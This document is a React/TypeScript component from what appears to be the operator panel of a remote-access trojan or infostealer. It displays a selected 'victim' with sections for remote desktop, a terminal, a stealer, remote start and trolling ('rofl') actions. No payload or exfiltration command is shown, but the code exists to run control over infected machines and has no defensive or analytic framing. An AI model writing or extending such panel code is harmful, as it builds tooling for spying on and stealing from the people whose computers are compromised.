"use client";

import { useMemo } from "react";

import type { Victim } from "../../api/victims";
import { usePanelDetailView } from "./panel-detail-view-provider";
import { DetailSidebar } from "./detail-sidebar";
import { InformationSection } from "./sections/information-section";
import { RemoteStartSection } from "./sections/remote-start-section";
import { RemoteDesktopSection } from "./sections/remote-desktop-section";
import { StealerSection } from "./sections/stealer-section";
import { RoflSection } from "./sections/rofl-section";
import { TerminalSection } from "./sections/terminal-section";

export function DetailView(props: { victims: Victim[] }) {
    const { victims } = props;
    const { isOpen, section, selectedVictimId, victimSnapshots } = usePanelDetailView();

    const victim = useMemo(() => {
        if (!selectedVictimId) return null;
        const id = String(selectedVictimId);
        const live = victims.find((v) => String(v.id ?? "") === id) ?? null;
        if (live) return live;
        return victimSnapshots && typeof victimSnapshots === "object" ? (victimSnapshots[id] ?? null) : null;
    }, [selectedVictimId, victimSnapshots, victims]);

    const isRemoteDesktop = section === "remote-desktop";
    const isTerminal = section === "terminal";
    const needsScroll = section === "rofl" || section === "stealer";

    if (!isOpen) return null;

    return (
        <div id="detailView" className={"view h-full min-h-0" + (isRemoteDesktop ? " isRemoteDesktop" : "")}>
            <div
                id="detailViewInner"
                className="relative grid h-full min-h-0 w-full grid-cols-[170px_1fr] bg-[var(--bg)]"
            >
                <DetailSidebar victim={victim} />

                <div
                    className={
                        "detail-main flex flex-col flex-1 min-h-0 border-l border-[rgba(120,120,120,0.6)] " +
                        (isRemoteDesktop
                            ? "h-full min-h-0 overflow-hidden p-0"
                            : isTerminal
                                ? "h-full min-h-0 overflow-hidden p-[12px_14px]"
                                : needsScroll
                                    ? "h-full min-h-0 overflow-y-auto p-[12px_14px] wc-scrollbar-transparent"
                                    : "h-auto overflow-y-visible p-[12px_14px]")
                    }
                >
                    {section === "information" && <InformationSection victim={victim} />}
                    {section === "remote-start" && <RemoteStartSection />}
                    {section === "remote-desktop" && <RemoteDesktopSection />}
                    {section === "stealer" && <StealerSection />}
                    {section === "rofl" && <RoflSection />}
                    {section === "terminal" && <TerminalSection />}
                </div>
            </div>
        </div>
    );
}
